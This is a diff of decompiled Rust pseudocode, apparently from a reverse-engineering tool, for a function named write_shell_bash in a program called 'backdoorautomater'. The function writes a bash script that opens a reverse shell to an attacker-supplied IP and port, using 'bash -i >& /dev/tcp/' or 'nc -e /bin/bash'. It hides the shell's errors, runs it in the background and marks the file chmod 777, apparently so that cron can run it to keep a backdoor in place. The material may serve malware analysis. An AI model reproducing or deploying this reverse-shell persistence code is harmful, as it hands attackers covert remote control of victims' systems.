@@ -20,11 +20,11 @@ fn backdoorautomater::cronshell::write_shell_bash(a0: &struct24, a1: &struct24, 
     let v18: struct24;  // [bp-0x168]
     let v19: struct149;  // [bp-0x168]
     let v20: std::fs::File;  // [bp-0x164]
-    let v21: u64;  // [bp-0x160]
+    let v21: core::fmt::Arguments;  // [bp-0x160]
     let v22: u128;  // [bp-0x158]
     let v23: struct56;  // [bp-0x98]
     let v24: struct56;  // [bp-0x60]
-    let v26: Result<(), &BOT>;  // r12
+    let v26: core::fmt::Arguments;  // r12
 
     v15 = std::fs::File::create(a2, a2);
     match v15 {
@@ -39,17 +39,17 @@ fn backdoorautomater::cronshell::write_shell_bash(a0: &struct24, a1: &struct24, 
             v24 = core::result::Result<T,E>::expect(&v4, "src/cronshell.rs");
             if *((&v23.field_32 as &char + 8) as &i64) && *((&v24.field_32 as &char + 8) as &i64) {
                 v26 = std::io::Write::write_all(&v0, "#!/bin/bash\n\n");
-                if let Ok(_) = v26 {
+                if !v26 {
                     v26 = std::io::Write::write_all(&v0, "/bin/bash -c 'bash -i >& /dev/tcp/");
-                    if let Ok(_) = v26 {
+                    if !v26 {
                         v26 = std::io::Write::write_all(&v0, *((a1 + 8) as &i64), *((a1 + 16) as &i64));
-                        if let Ok(_) = v26 {
+                        if !v26 {
                             v26 = std::io::Write::write_all(&v0, "/");
-                            if let Ok(_) = v26 {
+                            if !v26 {
                                 v26 = std::io::Write::write_all(&v0, *((a0 + 8) as &i64), *((a0 + 16) as &i64));
-                                if let Ok(_) = v26 {
+                                if !v26 {
                                     v26 = std::io::Write::write_all(&v0, " 0>&1' 2>/dev/null &\n");
-                                    if let Ok(_) = v26 {
+                                    if !v26 {
                                         goto LABEL_4637de;
                                     }
                                 }
@@ -59,23 +59,23 @@ fn backdoorautomater::cronshell::write_shell_bash(a0: &struct24, a1: &struct24, 
                 }
             } else {
                 v26 = std::io::Write::write_all(&v0, "#!/bin/bash\n\n");
-                if let Ok(_) = v26 {
+                if !v26 {
                     v15 = "REMOTE_IP=\"";
                     v22 = *((a1 + 8) as &i128);
                     v4 = alloc::str::join_generic_copy(&v19, 2, 1, 0);
                     v1 = v5;
                     alloc::vec::Vec<T,A>::extend_from_slice(&v1, "\"\n");
                     v26 = std::io::Write::write_all(&v0, v2, v3);
-                    if let Ok(_) = v26 {
+                    if !v26 {
                         v16 = "REMOTE_PORT=";
                         v22 = *((a0 + 8) as &i128);
                         v4 = alloc::str::join_generic_copy(&v19, 2, 1, 0);
                         v7 = v5;
                         alloc::vec::Vec<T,A>::extend_from_slice(&v7, "\n\n");
                         v26 = std::io::Write::write_all(&v0, v9, v10);
-                        if let Ok(_) = v26 {
+                        if !v26 {
                             v26 = std::io::Write::write_all(&v0, "/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n");
-                            if let Ok(_) = v26 {
+                            if !v26 {
 LABEL_4637de:
                                 v17 = "chmod 777 ";
                                 v22 = *((a2 + 8) as &i128);
